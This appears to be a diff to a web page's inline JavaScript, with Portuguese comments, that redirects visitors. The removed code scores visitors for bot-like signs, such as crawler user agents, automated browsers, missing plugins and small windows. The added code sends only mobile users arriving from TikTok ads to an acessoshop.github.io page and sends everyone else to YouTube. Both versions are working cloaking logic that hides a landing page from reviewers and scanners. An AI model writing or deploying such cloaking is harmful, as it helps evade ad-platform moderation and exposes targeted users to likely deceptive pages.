@@ -34,57 +34,29 @@
 <script>
 (function () {
 
-    const linkA = "https://acessoshop.github.io/roupas"; // desktop + bots
-    const linkB = "https://acessoshop.github.io/becca"; // mobile humano
+    const params = new URLSearchParams(window.location.search);
 
-    const ua = navigator.userAgent || "";
+    // Detecta parâmetros TikTok
+    const isTikTok =
+        params.has("ttclid") ||
+        params.has("tiktok_clid") ||
+        params.get("utm_source") === "tiktok";
 
-    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(ua);
+    // Detecta celular
+    const isMobile =
+        /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i
+        .test(navigator.userAgent);
 
-    function isBotLike() {
-        let score = 0;
+    // MOBILE + TikTok
+    if (isMobile && isTikTok) {
 
-        // User agents suspeitos
-        if (/bot|crawler|spider|facebookexternalhit|preview|monitor|headless|selenium|phantom|python|curl|wget|slurp|scanner/i.test(ua)) {
-            score++;
-        }
+        window.location.href = "https://acessoshop.github.io/becca";
 
-        // Navegador automatizado
-        if (navigator.webdriver) {
-            score++;
-        }
+    } else {
 
-        // Sem plugins instalados
-        if (navigator.plugins.length === 0) {
-            score++;
-        }
+        // Desktop ou link limpo
+        window.location.href = "https://www.youtube.com/";
 
-        // Sem idioma definido
-        if (!navigator.language || navigator.language.length < 2) {
-            score++;
-        }
-
-        // Mobile sem touch é estranho
-        if (isMobile && navigator.maxTouchPoints === 0) {
-            score++;
-        }
-
-        // Janela pequena/anormal
-        if (window.innerWidth < 300 || window.innerHeight < 300) {
-            score++;
-        }
-
-        return score >= 2;
-    }
-
-    // DESKTOP ou BOT = LINK A
-    if (!isMobile || isBotLike()) {
-        window.location.replace(linkA);
-    }
-
-    // MOBILE HUMANO = LINK B
-    else {
-        window.location.replace(linkB);
     }
 
 })();
